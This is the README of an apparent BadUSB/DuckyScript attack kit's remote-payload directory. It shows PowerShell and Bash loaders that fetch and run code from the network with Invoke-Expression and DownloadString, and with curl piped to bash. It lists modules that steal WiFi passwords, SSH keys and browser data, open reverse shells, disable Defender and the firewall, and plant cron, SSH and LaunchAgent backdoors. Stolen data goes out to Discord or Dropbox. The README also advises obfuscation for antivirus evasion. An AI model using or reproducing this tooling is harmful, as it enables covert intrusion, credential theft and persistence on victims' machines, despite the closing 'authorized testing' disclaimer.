# 🔧 Remote Payloads

> **PowerShell/Bash modules that do the actual work**

This directory contains the **remote scripts** that are downloaded and executed by the DuckyScript loaders. These are hosted on GitHub and pulled dynamically when a payload runs.

---

## 📁 Structure

```
remote-payloads/
├── loaders/
│   ├── loader.ps1     # Universal Windows loader
│   └── loader.sh      # Universal Linux/macOS loader
├── windows/
│   ├── exfil/         # Data extraction modules
│   ├── execution/     # System execution modules
│   ├── fun/           # Prank modules
│   ├── recon/         # Reconnaissance modules
│   └── persistence/   # Persistence modules
├── linux/
│   ├── exfil/
│   ├── execution/
│   ├── fun/
│   ├── recon/
│   └── persistence/
└── macos/
    ├── exfil/
    ├── execution/
    ├── fun/
    ├── recon/
    └── persistence/
```

---

## 🔄 How The Loader Works

### Windows (PowerShell)

```powershell
# Environment variables are set by the DuckyScript loader
$env:DC = "discord_webhook"  # Discord webhook
$env:M = "wifi"              # Module to load

# The loader maps module names to scripts
$modules = @{
    'wifi' = 'windows/exfil/wifi_grabber.ps1'
    'screenshot' = 'windows/exfil/screenshot.ps1'
    # ... etc
}

# Downloads and executes the module
Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
```

### Linux/macOS (Bash)

```bash
# Environment variables from DuckyScript
export DC="discord_webhook"
export M="wifi"

# The loader maps modules and detects OS
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
else
    OS="linux"
fi

# Downloads and executes
curl -sL "$BASE_URL/$OS/exfil/wifi_grabber.sh" | bash
```

---

## 📦 Module List

### Exfiltration (exfil/)

| Module | File | Description |
|--------|------|-------------|
| wifi | `wifi_grabber.{ps1,sh}` | Extract WiFi passwords |
| screenshot | `screenshot.{ps1,sh}` | Capture screen |
| sysinfo | `system_info.{ps1,sh}` | System information |
| browser | `browser_data.{ps1,sh}` | Browser history/data |
| clipboard | `clipboard.{ps1,sh}` | Clipboard contents |
| ip | `ip_info.ps1` | IP + geolocation |
| ssh | `ssh_keys.sh` | SSH keys (Linux/macOS) |
| env | `env_variables.sh` | Environment vars (Linux) |

### Execution (execution/)

| Module | File | Description |
|--------|------|-------------|
| shell | `reverse_shell.{ps1,sh}` | Reverse shell |
| admin | `create_admin.ps1` | Create admin user |
| rdp | `enable_rdp.ps1` | Enable RDP |
| defender | `disable_defender.ps1` | Disable Defender |
| firewall | `disable_firewall.ps1` | Disable firewall |
| download | `download_execute.sh` | Download & execute |

### Fun (fun/)

| Module | File | Description |
|--------|------|-------------|
| rickroll | `rickroll.{ps1,sh}` | Rick Roll 🎵 |
| wallpaper | `wallpaper_changer.{ps1,sh}` | Change wallpaper |
| tts | `text_to_speech.{ps1,sh}` | Computer speaks |
| bsod | `fake_bsod.ps1` | Fake BSOD |
| cmatrix | `cmatrix.sh` | Matrix rain |

### Recon (recon/)

| Module | File | Description |
|--------|------|-------------|
| recon | `full_recon.{ps1,sh}` | Full reconnaissance |

### Persistence (persistence/)

| Module | File | Description |
|--------|------|-------------|
| persist | `startup.ps1` | Multiple methods |
| cron | `cron_backdoor.sh` | Cron persistence |
| ssh | `ssh_backdoor.sh` | SSH key backdoor |
| agent | `launch_agent.sh` | macOS LaunchAgent |

---

## 🛠️ Helper Functions

All modules have access to these helper functions:

### Windows (PowerShell)

```powershell
# Send data to Discord
Send-Discord "Message" "optional_file_path"

# Send data to Dropbox
Send-Dropbox "content" "filename"

# Get system identifier
$sysid = Get-SystemID  # Returns "COMPUTERNAME-USERNAME"

# Cleanup traces
Clear-Traces  # Removes PowerShell history
```

### Linux/macOS (Bash)

```bash
# Send to Discord
send_discord "Message" "optional_file"

# Get system identifier
SYSID=$(get_sysid)  # Returns "hostname-username"

# Cleanup
clear_traces
```

---

## 🔧 Forking This Repo

If you fork this repo, update the `BASE_URL` in:

1. `loaders/loader.ps1` (line ~15)
2. `loaders/loader.sh` (line ~15)
3. `tools/modular_generator.py` (line ~25)

```
BASE_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/remote-payloads"
```

---

## ⚠️ Security Note

These scripts are pulled over HTTPS from GitHub. For operational security:

1. **Fork the repo** - Host your own copy
2. **Use short URLs** - Consider a URL shortener
3. **Obfuscate** - Consider encoding/obfuscating for AV evasion

---

## ⚖️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

See [DISCLAIMER.md](../DISCLAIMER.md).

